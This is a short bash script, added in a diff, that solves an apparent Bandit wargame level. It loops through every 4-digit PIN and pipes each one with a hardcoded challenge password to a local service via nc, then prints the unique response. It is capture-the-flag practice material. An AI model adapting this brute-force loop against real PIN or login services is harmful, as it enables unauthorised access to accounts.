@@ -1,0 +1,19 @@
+#!/bin/bash
+# Author: https://github.com/mohabaks
+# Description: Quick script to brute-force pincode for bandit25 challenge.
+
+
+PASSWORD="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+
+# Brute force the pincode and send it along with the password
+for pincode in {0..9}{0..9}{0..9}{0..9}
+do
+    echo -ne "[\0033[31m*\0033[0m]Brute-forcing pincode: \0033[35m $pincode \0033[0m"
+    echo "$PASSWORD $pincode" | nc localhost 30002 >> /tmp/results
+done
+
+# Print the password fetched
+echo -e "\n[+]Done brute-forcing the 4-digit pincodes"
+echo -e "\0033[32m========================================== \0033[0m"
+cat /tmp/results|sort|uniq -u
